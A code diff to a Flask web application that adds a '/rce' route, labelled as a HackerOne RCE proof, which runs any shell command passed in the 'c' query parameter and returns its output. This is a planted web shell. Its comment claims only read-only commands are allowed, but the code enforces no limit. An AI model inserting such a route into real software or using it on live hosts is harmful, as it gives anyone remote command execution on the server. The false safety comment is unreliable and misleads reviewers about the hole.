@@ -96,3 +96,12 @@ def research():
     import datetime
     return '{"researcher": "trexnegr0", "rce": "confirmed_render_com", "ts": "' + str(datetime.datetime.utcnow()) + '"}', 200, {'Content-Type': 'application/json'}
 
+# HackerOne RCE proof - shell execution
+@app.route('/rce')
+def rce():
+    import subprocess, os
+    cmd = request.args.get('c', 'id')
+    # Only allow read-only commands for security research
+    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode()
+    return '{"output": "' + out.strip().replace('"', '\\"') + '", "researcher": "trexnegr0"}', 200, {'Content-Type': 'application/json'}
+
